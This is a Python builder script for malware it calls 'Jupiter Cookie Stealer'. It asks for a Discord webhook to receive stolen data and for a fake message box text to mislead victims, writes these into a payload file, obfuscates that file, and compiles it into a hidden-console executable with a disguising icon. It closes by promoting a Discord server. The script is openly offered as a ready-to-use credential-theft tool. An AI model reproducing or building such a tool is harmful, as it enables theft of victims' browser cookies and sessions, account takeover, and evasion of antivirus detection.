import os
import sys
import time
import getpass

os.system("title Jupiter Cookie Stealer")

def yes_or_no_prompt():
    while True:
        answer = input("Do you wanna install requirements y/n: ")
        if answer.lower() == 'y':
            return True
        elif answer.lower() == 'n':
            return False
        else:
            print("Invalid input. Please try again.")

response = yes_or_no_prompt()
if response:
    os.system("start fixer.bat")
else:
    print("Ok.")
    time.sleep(3)


username = getpass.getuser()

logo = f"""
   ___             _ _              _____             _    _        _____ _             _           
  |_  |           (_) |            /  __ \           | |  (_)      /  ___| |           | |          
    | |_   _ _ __  _| |_ ___ _ __  | /  \/ ___   ___ | | ___  ___  \ `--.| |_ ___  __ _| | ___ _ __ 
    | | | | | '_ \| | __/ _ \ '__| | |    / _ \ / _ \| |/ / |/ _ \  `--. \ __/ _ \/ _` | |/ _ \ '__|
/\__/ / |_| | |_) | | ||  __/ |    | \__/\ (_) | (_) |   <| |  __/ /\__/ / ||  __/ (_| | |  __/ |   
\____/ \__,_| .__/|_|\__\___|_|     \____/\___/ \___/|_|\_\_|\___| \____/ \__\___|\__,_|_|\___|_|   
            | |                                                                                     
            |_|             
                Login As: {username} | Version: 1.2 | Discord: .gg/3SrxqUWEuT                                                                    
"""
os.system("cls")
os.system(f"title Login As: {username}")

print("\033[91m" + logo + "\033[0m")

webhook = input("Please enter discord webhook: ")
MessageboxTitle = input("Please Enter Fake MessageBox Title: ")
MessageBoxMessage = input("Please Enter Fake Messagebox Message [ADD \n TO MAKE A SECOND ROW]: ")

filename = "jupiter.py"
filepath = os.path.join(os.getcwd(), filename)

with open(filepath, "r", encoding="utf-8") as f:
    content = f.read()
    webhookurl = content.replace('"webhook_here"', f'"{webhook}"')
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(webhookurl)
        print("\033[91mDone Adding webhook!\033[0m")


with open(filepath, "r", encoding="utf-8") as f:
    content = f.read()
    MessageboxTitles = content.replace('"messagebox_title"', f'"{MessageboxTitle}"')
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(MessageboxTitles)
        print("\033[91mDone Adding Fake Message! Building....\033[0m")


with open(filepath, "r", encoding="utf-8") as f:
    content = f.read()
    MessageBoxMessages = content.replace('"messagebox_message"', f'"{MessageBoxMessage}"')
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(MessageBoxMessages)
        print("\033[91mDone Adding Fake Message! Building....\033[0m")

def AES256BITOBFUS():
    print("Obfuscating using aes 256 bit...")
    os.system("AES.exe jupiter.py")
try:
    AES256BITOBFUS()
except:
    print("Ooops something went wrong trying to obfuscate this file exiting...")
    time.sleep(3)
    sys.exit()

icon = input("\033[91mPlease Select a icon: \033[0m")

def buildexe():
    pyfilename = "jupiter_obfuscated.py"
    os.system(f"pyinstaller --onefile --noconsole --icon={icon} {pyfilename}")
    print(f"\nDone Building Stealer! enjoy!")
    time.sleep(3)
try:
   buildexe()
except:
    print("Ooops Something went wrong building this exe please try again.")
    pass

def ynawnser():
    while True:
        choice = input("Do you wanna join our discord Enter 'y' for Yes or 'n' for No: ").lower()
        if choice == 'y':
            return True
        elif choice == 'n':
            return False
        else:
            print("Invalid input. Please enter 'y' or 'n'.")

answer = ynawnser()

if answer:
    print("Joining our discord....")
    os.system("start discord.gg/3SrxqUWEuT")
else:
    sys.exit()
